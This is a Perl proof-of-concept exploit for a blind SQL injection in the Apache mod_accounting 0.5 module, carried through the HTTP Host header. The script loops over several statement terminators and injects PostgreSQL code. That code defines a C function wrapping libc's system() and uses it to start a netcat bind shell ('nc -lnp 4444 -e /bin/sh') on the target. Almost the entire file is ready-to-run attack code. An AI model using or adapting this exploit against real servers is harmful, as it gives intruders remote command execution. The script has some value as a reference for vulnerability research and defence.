#!/usr/bin/perl
# PoC of blind SQL injection in the mod_accounting/0.5 Apache module
# Injection can occur via the Host header
# As the injection occurs in a user defined insert statement a bit of trial and error is required
# Database operations occurs asyncronous to page response so timing attacks wont work
# This one is truely blind
# DB can be mysql or postgres, this PoC only covers postgres
# PoC executes netcat to listen on port 4444 (requires dba privileges)
use IO::Socket::INET;

print "#----------------------------------------------#\n";
print "| mod_accounting/0.5 PoC exploit by \@Wireghoul |\n";
print "|          www.justanotherhacker.com           |\n";
print "#----------Command execution via SQLi----------#\n";
print "[*] Enumerating blind injection vectors:\n";

my @endings = ("'));", '"));', "));", "');", '");', ");", "';", '";',";"); # These should terminate most insert statements
#my @endings = ( "');" );
my $shell = 'nc -lnp 4444 -e /bin/sh';
my $cnt = 0;
my $content = "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; SELECT system('$shell');";
foreach $end (@endings) {
  $cnt++;
  my $sock = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]") or die "Unable to connect to $ARGV[0]:$ARGV[1]: $!\n";
  my $str = "GET / HTTP/1.1\r\nHost: $ARGV[0]$cnt$end $content -- \r\n\r\n"; # from mysql.user into outfile '/tmp/pocpoc$cnt.txt'; -- \r\n\r\n";
  print "[-] Trying $end\n";
  print $sock $str;
  #print "Sent $end\n";
  close ($sock);
}
print "[*] Done, remote server should have executed $shell\n";
